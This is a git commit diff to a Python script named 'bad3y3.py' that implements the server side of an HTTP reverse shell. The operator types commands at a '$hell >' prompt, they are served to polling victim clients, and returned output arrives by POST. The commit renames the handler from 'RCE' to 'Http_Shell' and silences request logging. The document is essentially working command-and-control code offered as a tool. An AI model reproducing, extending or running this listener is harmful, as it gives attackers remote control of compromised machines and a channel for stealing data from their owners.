b1952d381e815d0e8c8a145050d6cc2bc8328280
rick porto <118774522+user-lc1bd6fl4q@users.noreply.github.com>
2023-02-17 16:16:21 -0300

    Update bad3y3.py

--- bad3y3.py
+++ bad3y3.py
@@ -2,27 +2,32 @@ import http.server, socketserver, signal
 
 PORT = 8000
 
-class RCE(http.server.SimpleHTTPRequestHandler):
+GREEN = '\033[38;5;47m'; END = '\033[0m'
+
+
+class Http_Shell(http.server.BaseHTTPRequestHandler):
     def do_GET(self):
         self.send_response(200)
         self.send_header('Content-type', 'text/html')
         self.end_headers()
-        command_input = input("shell > ")
+        command_input = input(f'{GREEN}$hell > {END}')
         self.wfile.write(bytes(command_input + '\n', "utf-8"))
+
     def do_POST(self):
         content_length = int(self.headers.get('Content-Length', 0))
         post_data = self.rfile.read(content_length)
         print(post_data.decode())
-        self.send_response(200)
-        self.send_header('Content-Type', 'text/plain')
-        self.end_headers()
+
+    def log_message(self, format, *args):
+        return
 
 def signal_handler(sig, frame):
     print("Closing server ...")
     httpd.server_close()
 
-with socketserver.TCPServer(("", PORT), RCE) as httpd:
-    print("Server started on port", PORT)
+
+with socketserver.TCPServer(("", PORT), Http_Shell) as httpd:
+    print("Listening on port", PORT)
     print(" ")
     httpd.serve_forever()
     signal.signal(signal.SIGINT, signal_handler)
